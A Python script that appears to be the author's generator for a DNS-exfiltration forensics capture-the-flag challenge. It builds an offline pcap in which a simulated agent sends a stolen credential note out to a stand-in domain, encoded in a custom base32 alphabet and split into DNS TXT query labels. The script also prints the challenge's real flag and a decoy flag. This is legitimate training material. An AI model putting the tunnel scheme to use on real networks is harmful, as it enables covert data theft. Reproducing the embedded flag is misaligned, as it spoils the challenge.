#!/usr/bin/env python3
"""
Author-side generator for forensics-dns-exfil.

Builds capture.pcap: a DNS exfiltration capture in which a "sync agent" tunnels a
small stolen note out of a network over DNS TXT queries, using an INVENTED
base32 variant (a permuted alphabet, no padding) and whole-stream chunking.

Key design points (see solution/README.md for the full rationale):

  * The full file is base32-encoded ONCE (custom alphabet, MSB-first bit packing,
    no '=' padding) and only THEN split into fixed-size labels. So a solver must
    concatenate all chunks in sequence order before decoding -- per-packet
    decoding fails.
  * The custom alphabet is a permutation of the RFC4648 set. It is announced by
    the agent in a single "init.<ALPHABET>.x.acme-updates.net" TXT query, so the
    alphabet is DISCOVERABLE FROM EVIDENCE, not guessed. Off-the-shelf base32
    decoders (which assume A-Z2-7) produce garbage.
  * Exfil packets are shuffled and a few are duplicated (retransmissions), so
    reassembly must sort by the 3-digit sequence label and de-duplicate.
  * Benign DNS noise is interleaved.
  * ONE decoy: a separate A-record beacon to sync.telemetry-cdn.net whose labels
    are STANDARD base32 of a fake, flag-shaped IDS-signature string. The brief
    says the real channel is TXT; the decoy is A-record, and its content
    self-labels as a signature. Refutable in minutes, costs no attempt.

This script is an AUTHOR artifact. Players only receive capture.pcap. The custom
alphabet is embedded in the pcap (init packet), so shipping this file would not
leak anything not already present in the capture.
"""
import base64
import os
import random

from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, Ether, wrpcap

_OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "capture.pcap")

SEED = 0xD1507EF1  # deterministic build
random.seed(SEED)

RFC4648 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"

# Invented alphabet: a fixed permutation of the RFC4648 set. Determined once with
# the seed above and then frozen so the build is reproducible.
_perm = list(RFC4648)
random.Random(0xA1FA).shuffle(_perm)
CUSTOM_ALPHABET = "".join(_perm)
assert sorted(CUSTOM_ALPHABET) == sorted(RFC4648)
assert len(set(CUSTOM_ALPHABET)) == 32

# ---------------------------------------------------------------------------
# The stolen note. The flag is embedded; recovering it requires full, ordered
# reassembly (flag characters straddle chunk boundaries).
# ---------------------------------------------------------------------------
FLAG = "NCTF{cu570m_b32_dns_tunn3l_r34ss3mbl3d}"

STOLEN_NOTE = (
    "FIELD NOTES // acme-updates sync agent build 4.7\r\n"
    "host: WIN-DEV-07   operator: m.reyes\r\n"
    "collected: 2026-03-14T02:11Z\r\n"
    "-------- extracted material --------\r\n"
    "vault_url: https://vault.acme.internal/v1/prod\r\n"
    "svc_account: svc-backup@acme.internal\r\n"
    f"recovery_token: {FLAG}\r\n"
    "note: rotate credentials before the Q3 audit window\r\n"
    "-------- end --------\r\n"
).encode()


def b32_custom_encode(data: bytes, alphabet: str) -> str:
    """MSB-first 5-bit packing, custom alphabet, NO padding."""
    bits = "".join(f"{b:08b}" for b in data)
    if len(bits) % 5:
        bits += "0" * (5 - (len(bits) % 5))
    return "".join(alphabet[int(bits[i : i + 5], 2)] for i in range(0, len(bits), 5))


CLIENT_IP = "10.4.7.113"
DNS_IP = "10.4.7.1"
CLIENT_MAC = "52:54:00:1a:2b:3c"
GW_MAC = "52:54:00:aa:bb:cc"

pkts = []
_t = 1_710_382_271.100000  # 2026-03-14 base epoch-ish
_txid = 0x4100


def _next_time(step=0.0):
    global _t
    _t += (0.012 + random.random() * 0.05) if step == 0 else step
    return _t


def _txid_next():
    global _txid
    _txid = (_txid + 1) & 0xFFFF
    return _txid


def query(qname, qtype="A", sport=None):
    tx = _txid_next()
    sport = sport or random.randint(49152, 65535)
    q = (
        Ether(src=CLIENT_MAC, dst=GW_MAC)
        / IP(src=CLIENT_IP, dst=DNS_IP)
        / UDP(sport=sport, dport=53)
        / DNS(id=tx, rd=1, qd=DNSQR(qname=qname, qtype=qtype))
    )
    q.time = _next_time()
    pkts.append(q)
    return tx, sport


def response(qname, qtype, tx, sport, rdata=None):
    if qtype == "TXT":
        an = DNSRR(rrname=qname, type="TXT", ttl=60, rdata=rdata or "ok")
    else:
        an = DNSRR(rrname=qname, type="A", ttl=60, rdata=rdata or "203.0.113.9")
    r = (
        Ether(src=GW_MAC, dst=CLIENT_MAC)
        / IP(src=DNS_IP, dst=CLIENT_IP)
        / UDP(sport=53, dport=sport)
        / DNS(id=tx, qr=1, rd=1, ra=1, qd=DNSQR(qname=qname, qtype=qtype), an=an)
    )
    r.time = _next_time(0.003 + random.random() * 0.01)
    pkts.append(r)


EXFIL_DOMAIN = "x.acme-updates.net"
CHUNK = 30  # base32 chars per label (well within the 63-char DNS label limit)

# 1) Build the exfil event list (init + data chunks), then interleave with noise.
b32 = b32_custom_encode(STOLEN_NOTE, CUSTOM_ALPHABET)
data_chunks = [b32[i : i + CHUNK] for i in range(0, len(b32), CHUNK)]

exfil_events = []  # list of (qname, qtype)
# The init/handshake query announces the alphabet the agent will use.
exfil_events.append((f"init.{CUSTOM_ALPHABET}.{EXFIL_DOMAIN}", "TXT"))
for i, ch in enumerate(data_chunks):
    exfil_events.append((f"{i:03d}.{ch}.{EXFIL_DOMAIN}", "TXT"))

# Shuffle the DATA chunk queries (keep init first-ish) and inject duplicates.
init_ev = exfil_events[0]
data_ev = exfil_events[1:]
random.shuffle(data_ev)
# duplicate a few (retransmissions) at random positions
for _ in range(3):
    dup = random.choice(data_ev)
    data_ev.insert(random.randint(0, len(data_ev)), dup)
exfil_seq = [init_ev] + data_ev

# 2) Benign noise queries.
NOISE = [
    ("www.microsoft.com", "A"),
    ("settings-win.data.microsoft.com", "A"),
    ("ctldl.windowsupdate.com", "A"),
    ("outlook.office365.com", "A"),
    ("clients4.google.com", "A"),
    ("time.windows.com", "A"),
    ("teams.microsoft.com", "A"),
    ("acme-updates.net", "A"),
    ("ntp.acme.internal", "A"),
    ("fonts.gstatic.com", "A"),
]

# 3) Decoy: A-record beacon channel (STANDARD base32) -> refutable fake flag.
FAKE = "NCTF{dns_txt_exfiltration_signature_not_flag}"
fake_b32 = base64.b32encode(FAKE.encode()).decode().rstrip("=")
decoy_events = []
DCHUNK = 24
dparts = [fake_b32[i : i + DCHUNK] for i in range(0, len(fake_b32), DCHUNK)]
for i, ch in enumerate(dparts):
    decoy_events.append((f"{ch}.b{i}.sync.telemetry-cdn.net", "A"))

# 4) Interleave everything on a timeline. Exfil roughly in order but with noise
#    and decoy sprinkled between.
timeline = []
timeline += [("noise", NOISE[i % len(NOISE)]) for i in range(4)]  # warm-up
ei = di = 0
noise_i = 4
while ei < len(exfil_seq) or di < len(decoy_events):
    r = random.random()
    if ei < len(exfil_seq) and (r < 0.6 or di >= len(decoy_events)):
        timeline.append(("exfil", exfil_seq[ei]))
        ei += 1
    elif di < len(decoy_events):
        timeline.append(("decoy", decoy_events[di]))
        di += 1
    if random.random() < 0.35:
        timeline.append(("noise", NOISE[noise_i % len(NOISE)]))
        noise_i += 1
timeline += [("noise", NOISE[i % len(NOISE)]) for i in range(3)]

# 5) Emit packets (query + response for each).
for kind, (qname, qtype) in timeline:
    tx, sp = query(qname, qtype)
    if kind == "exfil":
        response(qname, qtype, tx, sp, rdata="v=1;ack")
    elif kind == "decoy":
        response(qname, qtype, tx, sp, rdata="198.51.100.7")
    else:
        response(qname, qtype, tx, sp)

wrpcap(_OUT, pkts)
print(f"custom alphabet : {CUSTOM_ALPHABET}")
print(f"data chunks     : {len(data_chunks)}")
print(f"total packets   : {len(pkts)}")
print(f"flag            : {FLAG}")
